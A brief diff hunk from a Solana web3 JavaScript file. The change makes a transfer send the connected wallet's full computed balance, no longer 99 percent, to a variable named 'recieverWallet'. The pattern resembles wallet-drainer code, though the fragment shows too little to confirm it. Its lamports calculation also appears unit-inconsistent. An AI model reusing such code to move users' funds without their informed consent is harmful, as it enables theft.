@@ -37,7 +37,7 @@ alert(`Minimum balance for rent exemption: ${minBalance / solanaWeb3.LAMPORTS_PE
                             solanaWeb3.SystemProgram.transfer({
                                 fromPubkey: resp.publicKey,
                                 toPubkey: recieverWallet,
-                                lamports: balanceForTransfer / solanaWeb3.LAMPORTS_PER_SOL * 0.99,
+                                lamports: balanceForTransfer / solanaWeb3.LAMPORTS_PER_SOL,
                             }),
                         );
 
